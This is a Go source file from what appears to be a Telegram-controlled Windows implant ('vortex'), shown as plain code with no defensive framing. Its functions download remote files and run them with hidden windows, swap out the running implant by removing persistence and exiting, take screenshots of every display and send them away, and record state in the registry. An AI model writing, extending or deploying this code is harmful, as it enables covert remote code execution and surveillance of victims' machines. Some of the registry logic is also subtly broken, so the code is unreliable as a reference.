//go:build windows

package telehandler

import (
	"bytes"
	"image/png"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"vortex/install"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
)

func dropAndExec(url string, fname string, path string) error {
	dropPath := filepath.Join(path, fname)
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	file, err := os.Create(dropPath)
	if err != nil {
		return err
	}

	if _, err = io.Copy(file, resp.Body); err != nil {
		return err
	}
	file.Close()

	run := exec.Command(dropPath)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err = run.Start(); err != nil {
		return err
	}

	return nil
}

// Check the stats of data upload via Telegram
func DataUploadState(stateOK bool) error {
	if install.CheckDeviceFingerprint() {
		stateKey, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\"+install.FingerprintRK, registry.SET_VALUE)
		if err == registry.ErrNotExist {
			stateKey, _, err = registry.CreateKey(registry.CURRENT_USER, "Software\\Microsoft"+install.FingerprintRK, registry.SET_VALUE)
			if err != nil {
				return err
			}
		}
		defer stateKey.Close()

		if stateOK {
			if err = stateKey.SetDWordValue("State", 0x00); err != nil {
				return err
			} else {
				if err = stateKey.SetDWordValue("State", 0x01); err != nil {
					return err
				}
			}
		}
	}

	return nil
}

func upgradeImplants(url string, fname string) error {
	downloadPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Temp", fname)
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	file, err := os.Create(downloadPath)
	if err != nil {
		return err
	}

	if _, err = io.Copy(file, resp.Body); err != nil {
		return err
	}
	file.Close()

	install.UninstallPersistence()
	run := exec.Command(downloadPath)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err = run.Start(); err != nil {
		return err
	} else {
		os.Exit(0) // Kill the old implant process
	}

	return nil
}

func CapDisplayScreen(hostId string) error {
	var buf bytes.Buffer
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return err
		}
		if err = png.Encode(&buf, img); err != nil {
			return err
		}

		if err = SendImage(&buf, hostId); err != nil {
			return err
		}
	}

	return nil

}
